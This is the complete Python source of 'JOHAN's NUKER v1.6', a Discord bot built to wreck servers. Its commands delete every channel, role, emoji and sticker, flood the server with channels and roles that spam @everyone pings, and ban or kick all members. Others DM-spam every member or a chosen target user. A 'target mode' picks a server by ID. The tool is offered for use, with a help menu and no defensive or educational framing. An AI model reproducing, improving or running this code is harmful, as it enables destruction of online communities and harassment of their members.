# JOHAN's NUKER | v1.6 | Developed by J0HAN

# IMPORTING
import discord, asyncio, random, time
from colorama import Fore as F

# CONFIG
try:
    with open("config.txt") as f:
        tkn=f.readline()
        usrID=f.readline()
        prfx=f.readline()
except:
    print("Unable to locate 'config.txt' file.\n")
    exit()

# TESTING
try:
    print(F.RED)
    bot=discord.Client(intents=discord.Intents.all())
except:
    print("Please run the 'setup.bat' file.\n")
    exit()

# COLOURS
err=F.RED
wrn=F.YELLOW
scs=F.GREEN
dec=F.LIGHTBLUE_EX
otr=F.CYAN
dft=F.RESET
hde=F.BLACK

# Target Mode
trgt_on=input(f"{dft}Enable Target Mode? (y/n) ")
if trgt_on=="y":
    gldID=input("Target Server ID: ")
    if len(gldID) > 17:
        try:
            int(gldID)
            trgt_on=True
            print(f"{scs}Target mode is now enabled!")
        except:
            trgt_on=False
            print(f"{wrn}Invalid server ID, target mode turned off.")  
    else:
        trgt_on=False
        print(f"{wrn}Invalid server ID, target mode turned off.")
else:
    trgt_on=False
    print(f"{wrn}Target mode will not be enabled.")

print(hde)

# START-UP
@bot.event
async def on_ready():
    global trgt_on, ctx, usr

    try:
        usr=await bot.fetch_user(usrID)
    except:
        print(f"\n{err}INVALID USER ID")
        exit()
        
    if trgt_on==True:
        try:
            ctx=await bot.fetch_guild(gldID)
            gld=ctx
        except:
            print(f"\n{wrn}Invalid server ID given. Target mode disabled.")
            trgt_on=False
            gld="None"
    else:
        gld="None"
    
    # Title
    print(f"""{dec}\n
 ██████   █████ █████   ████ ███████████  
░░██████ ░░███ ░░███   ███░ ░░███░░░░░███ 
 ░███░███ ░███  ░███  ███    ░███    ░███           {dft}┏︱Bot: {bot.user}{dec}
 ░███░░███░███  ░███████     ░██████████            {dft}┠︱User: {usr}{dec}
 ░███ ░░██████  ░███░░███    ░███░░░░░███           {dft}┠︱Server: {gld}{dec}
 ░███  ░░█████  ░███ ░░███   ░███    ░███           {dft}┗︱Prefix: {prfx}{dec}
 █████  ░░█████ █████ ░░████ █████   █████
 ░░░░░    ░░░░░ ░░░░░   ░░░░ ░░░░░   ░░░░░ 
""")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"for {prfx}help"))

# MESSAGE RESPONDER
@bot.event
async def on_message(message):
    if message.author==bot.user:
        return

    global ctx, sym
    msg=message.content.lower()
    dbg_on=True
    sym="▲"

    if trgt_on==False:
        ctx=message.guild

    if msg.endswith("--clean"):
        dbg_on=False

    if dbg_on==False:
        sym="◄"

    # Creating
    async def mcp(amt, c_name, spm):
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Beginning mass channel ping...")
        c_made=0
        strt=time.time()
        while c_made < amt:
            try:
                new_c=await ctx.create_text_channel(c_name)
                c_made+=1
                if dbg_on==True:
                    print(f"{scs}✚ Text channel created! ({c_made}/{amt})")
                try:
                    loop1=asyncio.get_event_loop()
                    loop1.create_task(spam(new_c, random.randint(1,4), "@everyone " + spm))
                except:
                    print(f"{wrn}━ Unable to begin spamming messages. Waiting {err_wait}s to retry.")
                    await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
            except:
                print(f"{wrn}━ Unable to create text channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==0.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}{sym} Mass channel ping has been finished with {c_made} channels being made. ({str(time.time()-strt)}s)")

    async def mc1(amt, c_name):
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\nMass category creation is in progress...")
        c_created=0
        strt=time.time()
        while c_created < amt:
            try:
                await ctx.create_category(name=c_name)
                c_created+=1
                if dbg_on==True:
                    print(f"{scs}✚ Category created! ({c_created}/{amt})")
            except:
                print(f"{wrn}━ Unable to create category. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ Mass category creation has been finished with {c_created} categories being made. ({str(time.time()-strt)}s)")

    async def mc2(amt, c_name):
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Mass text channel creation is in progress...")
        c_made=0
        strt=time.time()
        while c_made < amt:
            try:
                await ctx.create_text_channel(c_name)
                c_made+=1
                if dbg_on==True:
                    print(f"{scs}✚ Text channel created! ({c_made}/{amt})")
            except:
                print(f"{wrn}━ Unable to create text channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ Mass text channel creation has been finished with {c_made} channels being made. ({str(time.time()-strt)}s)")

    async def mv(amt, v_name):
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\nMass voice channel creation is in progress...")
        v_created=0
        strt=time.time()
        while v_created < amt:
            try:
                await ctx.create_voice_channel(name=v_name)
                v_created+=1
                if dbg_on==True:
                    print(f"{scs}✚ Voice channel created! ({v_created}/{amt})")
            except:
                print(f"{wrn}━ Unable to create voice channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ Mass voice channel creation has been finished with {v_created} channels being made. ({str(time.time()-strt)}s)")

    async def mr(amt, r_name):
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Mass role creation is in progress...")
        r_created=0
        strt=time.time()
        while r_created < amt:
            try:
                await ctx.create_role(name=r_name)
                r_created+=1
                if dbg_on==True:
                    print(f"{scs}✚ Role created! ({r_created}/{amt})")
            except:
                print(f"{wrn}━ Unable to create role. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ Mass role creation has been finished with {r_created} roles being made. ({str(time.time()-strt)}s)")

    # Deleting
    async def dca():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Deleting all the categories...")
        c_del=0
        tl_c=len(ctx.categories)
        strt=time.time()
        for c in ctx.categories:
            try:
                await c.delete()
                c_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Category deleted! ({c_del}/{tl_c})")
            except:
                print(f"{wrn}━ Unable to delete category. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {c_del} out of {tl_c} categories have been deleted. ({str(time.time()-strt)}s)")

    async def dc():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Deleting all the channels...")
        c_del=0
        tl_c=len(ctx.channels)
        strt=time.time()
        for c in ctx.channels:
            try:
                await c.delete()
                c_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Channel deleted! ({c_del}/{tl_c})")
            except:
                print(f"{wrn}━ Unable to delete channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {c_del} out of {tl_c} channels have been deleted. ({str(time.time()-strt)}s)")

    async def dt():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Deleting all the text channels...")
        t_del=0
        tl_t=len(ctx.text_channels)
        strt=time.time()
        for t in ctx.text_channels:
            try:
                await t.delete()
                t_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Text channel deleted! ({t_del}/{tl_t})")
            except:
                print(f"{wrn}━ Unable to delete text channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {t_del} out of {tl_t} text channels have been deleted. ({str(time.time()-strt)}s)")

    async def dv():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Deleting all the voice channels...")
        v_del=0
        tl_v=len(ctx.voice_channels)
        strt=time.time()
        for v in ctx.voice_channels:
            try:
                await v.delete()
                v_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Voice channel deleted! ({v_del}/{tl_v})")
            except:
                print(f"{wrn}━ Unable to delete voice channel. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {v_del} out of {tl_v} voice channels have been deleted. ({str(time.time()-strt)}s)")

    async def dr():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\n▼ Deleting all the roles...")
        r_del=0
        tl_r=len(ctx.roles)
        strt=time.time()
        for r in ctx.roles:
            try:
                await r.delete()
                r_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Role deleted! ({r_del}/{tl_r})")
            except:
                print(f"{wrn}━ Unable to delete role. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {r_del} out of {tl_r} roles have been deleted. ({str(time.time()-strt)}s)")

    async def de():
        err_wait=.2
        if dbg_on==True:
            print(f"{dft}\nDeleting all the emojis...")
        e_del=0
        tl_e=len(ctx.emojis)
        strt=time.time()
        for e in ctx.emojis:
            try:
                await e.delete()
                e_del+=1
                if dbg_on==True:
                    print(f"{scs}✚ Emoji deleted! ({e_del}/{tl_e})")
            except:
                print(f"{wrn}━ Unable to delete emoji. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {e_del} out of {tl_e} roles have been deleted. ({str(time.time()-strt)}s)")

    async def ds():
        err_wait=.2
        s_deleted=0
        total_s=len(ctx.stickers)
        strt=time.time()
        for s in ctx.stickers:
            try:
                await s.delete()
                s_deleted+=1
                if dbg_on==True:
                    print(f"{scs}✚ Sticker deleted! ({s_deleted}/{total_s})")
            except:
                print(f"{wrn}━ Unable to delete sticker. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {s_deleted} out of {total_s} roles have been deleted. ({str(time.time()-strt)}s)")

    # Member Stuff
    async def be():
        err_wait=.2
        print(f"{dft}\n▼ Banning everyone...")
        m_banned=0
        total_m=len(ctx.members)
        strt=time.time()
        for m in ctx.members:
            try:
                if m.user!=usr:
                    await m.ban(reason="SERVER NUKED")
                    m_banned+=1
                    if dbg_on==True:
                        print(f"{scs}✚ Member has been banned! ({m_banned}/{total_m})")
            except:
                print(f"{wrn}━ Unable to ban member. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {m_banned} out of {total_m} members have been banned. ({str(time.time()-strt)}s)")

    async def ke():
        err_wait=.2
        print(f"{dft}\n▼ Kicking everyone...")
        m_kicked=0
        total_m=len(ctx.members)
        strt=time.time()
        for m in ctx.members:
            try:
                if m.user!=usr:
                    await m.kick(reason="SERVER NUKED")
                    m_kicked+=1
                    print(f"{scs}✚ Member has been kicked! ({m_kicked}/{total_m})")
            except:
                print(f"{wrn}━ Unable to kick member. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {m_kicked} out of {total_m} members have been kicked. ({str(time.time()-strt)}s)")

    # Other
    async def spam(c, amt, notice):
        err_wait=.2
        n_sent=0
        while n_sent < amt:
            try:
                await c.send(notice)
                n_sent+=1
            except:
                print(f"{wrn}━ Unable to send spam message. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5

    async def dmall(notice):
        err_wait=.2
        print(f"{dft}\n▼ DMing everyone...")
        n_sent=0
        total_m=len(ctx.members)
        strt=time.time()
        for m in ctx.members:
            try:
                dm=await m.create_dm()
                loop1=asyncio.get_event_loop()
                loop1.create_task(spam(dm, 1, notice))
                n_sent+=1
                if dbg_on==True:
                    print(f"{scs}✚ DM has been sent to member! ({n_sent}/{total_m})")
            except:
                print(f"{wrn}━ Unable to send DM to member. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {n_sent} out of {total_m} members have been DMed. ({str(time.time()-strt)}s)")

    async def dmspam(trgt, amt, notice):
        err_wait=.2
        print(f"{dft}\n▼ DM spamming target...")
        n_sent=0
        strt=time.time()
        try:
            dm=await trgt.create_dm()
        except:
            print(f"{wrn}━ Unable to start DMing target.")
        while n_sent < amt:
            try:
                await dm.send(notice)
                n_sent+=1
                if dbg_on==True:
                    print(f"{scs}✚ DM has been sent to target! ({n_sent}/{amt})")
            except:
                print(f"{wrn}━ Unable to send DM to target. Waiting {err_wait}s to retry.")
                await asyncio.sleep(err_wait)
                if err_wait==.2:
                    err_wait=1
                else:
                    err_wait+=.5
        print(f"{dft}▲ {n_sent} out of {amt} messages have been sent to target. ({str(time.time()-strt)}s)")

    async def hide():
        print(f"{dft}\n◄ Hider function has been used.")
        try:
            await bot.change_presence(status=discord.Status.offline)
            await asyncio.sleep(1)
            await bot.change_presence(status=discord.Status.online)
            print(f"{scs}✚ The hiding function seems to be able to work!")
            while True:
                try:
                    await bot.change_presence(status=discord.Status.offline)
                    await asyncio.sleep(1)
                    await bot.change_presence(status=discord.Status.online)
                    await asyncio.sleep(1)
                except:
                    print(f"{wrn}\nHider has broke, it has now been cancelled.")
                    break
        except:
            print(f"{wrn}━ The hider doesn't seem like it's able to work.")

    # COMMANDS
    try:
        if msg.startswith(f"{prfx}help"):
            print(f"{dft}\n◄ The help command has been used.")
            embed=discord.Embed(title="JOHAN NUKER | v1.6", description=f"""**Commands:**
* {prfx}nuke [y/n] — Automatic nuke that deletes everything, mass channel pings, mass roles, and (optionally) bans everyone
* {prfx}mcp [amount] [name] [message] — Creates channels and then sends 1-4 messages in them²
* {prfx}categories [amount] [name] — Creates categories in the amount specified
* {prfx}channels [amount] [name] — Creates a specified number of channels with the given name
* {prfx}voice [amount] [name] — Creates a number of voice channels with the name given
* {prfx}roles [amount] [name] — Creates a certain number of roles with whatever name you want
* {prfx}del — Deletes all categories, channels, voice, channels, roles, emojis, and stickers
* {prfx}cadel — Deletes all the categories
* {prfx}cdel — Deletes all the channels
* {prfx}tdel — Deletes all the text channels
* {prfx}vdel — Deletes all the voice channels
* {prfx}rdel — Deletes all the roles
* {prfx}edel — Deletes all the emojis
* {prfx}sdel — Deletes all the stickers
* {prfx}ban — Bans everyone
* {prfx}kick — Kicks everyone
* {prfx}dmall [message] — DMs every server member a message once
* {prfx}dmspam [user] [amount] [message] — Spams someone in their DMs
* {prfx}hide — Changes status from online to offline every second (may slow down other functions)*
¹If you'd like to ban everyone at the end then send the command as '{prfx}ban y'.
²No need to add everyone ping, it is automatically added at the beginning of the message with a space after.

Tip: Add '--clean' after a command to turn off logging messages in terminal (doesn't work for commands that have an asterisk after).""", colour=0x336EFF)
            embed.set_author(name=message.author, icon_url=message.author.avatar)
            embed.set_footer(text="Developed by J0HAN")
            try:
                await message.reply(embed=embed)
                print(f"{scs}✚ Help message successfully sent!")
            except:
                print(f"{wrn}━ Unable to send help message.")

        elif msg.startswith(f"{prfx}nuke"):
            print(f"{otr}\n► NUKE BEGAN")
            dbg_on=False
            cmdN=msg.split(" ")
            await ctx.edit(name=f"NUKED SERVER")
            loop2=asyncio.get_event_loop()
            loop2.create_task(dc())
            loop2.create_task(dr()) # Note: Discord really doesn't like you creating/deleting a lot of roles quickly
            await asyncio.gather(mcp(100, "get-nuked", "GET NUKED"), mr(50, "GET NUKED"), de(), ds())
            if len(cmdN) > 1:
                if cmdN[1]=="y":
                    await be()
            asyncio.wait_for(loop2, timeout=None)
            dbg_on=True
            print(f"{otr}\n► NUKE OVER")

        # Creation
        elif msg.startswith(f"{prfx}mcp"):
            cmd=msg.split(" ", 3)
            if len(cmd) > 3:
                try:
                    amt=int(cmd[1])
                    await mcp(amt, cmd[2], cmd[3])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}categories"):
            cmdC1=msg.split(" ", 2)
            if len(cmdC1) > 2:
                try:
                    amtC1=int(cmdC1[1])
                    await mc1(amtC1, cmdC1[2])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}channels"):
            cmdC2=msg.split(" ", 2)
            if len(cmdC2) > 2:
                try:
                    amtC2=int(cmdC2[1])
                    await mc2(amtC2, cmdC2[2])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}voice"):
            cmdV=msg.split(" ", 2)
            if len(cmdV) > 2:
                try:
                    amtV=int(cmdV[1])
                    await mv(amtV, cmdV[2])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}roles"):
            cmdR=msg.split(" ", 2)
            if len(cmdR) > 2:
                try:
                    amtR=int(cmdR[1])
                    await mr(amtR, cmdR[2])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        # Deletion
        elif msg.startswith(f"{prfx}del"):
            print(f"\n{otr}► MASS DELELTION BEGAN")
            dbg_on=False
            await asyncio.gather(dc(), dr(), de(), ds())
            dbg_on=True
            print(f"{otr}\n► MASS DELETION OVER")

        elif msg.startswith(f"{prfx}cadel"):
            await dca()

        elif msg.startswith(f"{prfx}cdel"):
            await dc()

        elif msg.startswith(f"{prfx}tdel"):
            await dt()

        elif msg.startswith(f"{prfx}vdel"):
            await dv()

        elif msg.startswith(f"{prfx}rdel"):
            await dr()

        elif msg.startswith(f"{prfx}edel"):
            await de()

        elif msg.startswith(f"{prfx}sdel"):
            await ds()

        elif msg.startswith(f"{prfx}ban"):
            await be()

        elif msg.startswith(f"{prfx}kick"):
            await ke()

        elif msg.startswith(f"{prfx}spam"):
            print(f"{dft}\n▼ Spamming messages...")
            cmdS=msg.split(" ", 2)
            if len(cmdS) > 2:
                try:
                    amtS=int(cmdS[1])
                    await spam(message.channel, amtS, "@everyone " + cmdS[2])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")
            

        elif msg.startswith(f"{prfx}dmall"):
            cmdD1=msg.split(" ", 1)
            if len(cmdD1) > 1:
                await dmall(cmdD1[1])
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}dmspam"):
            cmdD2=msg.split(" ", 3)
            if len(cmdD2) > 3:
                try:
                    if cmdD2[1].startswith("<"):
                        trgt1=cmdD2[1].replace("<@", "")
                        trgt2=trgt1.replace(">", "")
                        trgt=await bot.fetch_user(trgt2)
                    else:
                        trgt=await bot.fetch_user(cmdD2[1])
                    amtD=int(cmdD2[2])
                    await dmspam(trgt, amtD, cmdD2[3])
                except:
                    await message.reply("Error, did you put everything in correctly?")
            else:
                await message.reply("Please enter all required arguments.")

        elif msg.startswith(f"{prfx}hide"):
            await hide()
    except:
        await message.reply("Looks like an execution error occurred.")
try:
    bot.run(tkn)
except:
    print(f"{err}INVALID TOKEN GIVEN\n{dft}")
